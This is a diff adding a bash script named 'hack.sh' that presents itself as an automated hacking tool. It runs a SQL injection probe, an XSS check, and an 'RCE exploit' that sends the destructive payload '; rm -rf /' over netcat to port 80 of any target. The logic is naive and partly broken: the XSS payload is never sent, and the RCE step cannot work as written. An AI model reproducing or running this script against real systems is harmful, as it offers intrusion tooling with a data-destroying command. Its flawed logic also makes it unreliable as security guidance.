@@ -1,0 +1,82 @@
+#!/bin/bash
+
+# SQL Injection module
+function sql_inject() {
+    URL=$1
+    PARAM=$2
+    PAYLOAD="' OR '1'='1"  # Basic SQL injection payload
+
+    RESPONSE=$(curl -s "$URL?$PARAM=$PAYLOAD")
+    if [[ $RESPONSE == *"SQL error"* || $RESPONSE == *"syntax error"* ]]; then
+        echo "SQL Injection vulnerability detected!"
+        return 0  # Success
+    else
+        return 1  # Vulnerability not found
+    fi
+}
+
+# Cross-Site Scripting (XSS) module
+function xss_attack() {
+    URL=$1
+    XSS_PAYLOAD="<script>alert('XSS!');</script>"
+
+    RESPONSE=$(curl -s "$URL")
+    if [[ $RESPONSE == *"<script>"* ]]; then
+        echo "XSS vulnerability detected!"
+        return 0  # Success
+    else
+        return 1  # Vulnerability not found
+    fi
+}
+
+# Remote Code Execution (RCE) attempt
+function rce_exploit() {
+    IP=$1
+    RCE_PAYLOAD="; rm -rf /; echo 'RCE executed!'"  # Dangerous payload for demonstration
+
+    RESPONSE=$(nc -zv $IP 80 2>&1)
+    if [[ $RESPONSE == *"succeeded"* ]]; then
+        echo "RCE attempt: Sending payload..."
+        nc $IP 80 <<< "$RCE_PAYLOAD"
+        echo "RCE payload sent!"
+        return 0  # Payload sent successfully
+    else
+        echo "RCE attempt failed. Could not connect to $IP"
+        return 1  # RCE attempt failed
+    fi
+}
+
+# Main script
+
+if [[ $# -ne 1 ]]; then
+    echo "Usage: ./hack.sh <target_url_or_ip>"
+    exit 1
+fi
+
+TARGET=$1
+
+echo "Initiating automated hacking script..."
+
+# SQL Injection attempt
+echo "Testing SQL Injection..."
+if sql_inject $TARGET "parameter"; then
+    echo "SQL Injection successful!"
+else
+    echo "SQL Injection failed."
+fi
+
+# XSS Attack
+echo "Testing Cross-Site Scripting..."
+if xss_attack $TARGET; then
+    echo "XSS vulnerability found!"
+else
+    echo "XSS attempt failed."
+fi
+
+# RCE Exploit
+echo "Attempting Remote Code Execution..."
+if rce_exploit $TARGET; then
+    echo "RCE payload executed remotely!"
+fi
+
+echo "Hacking script execution completed."
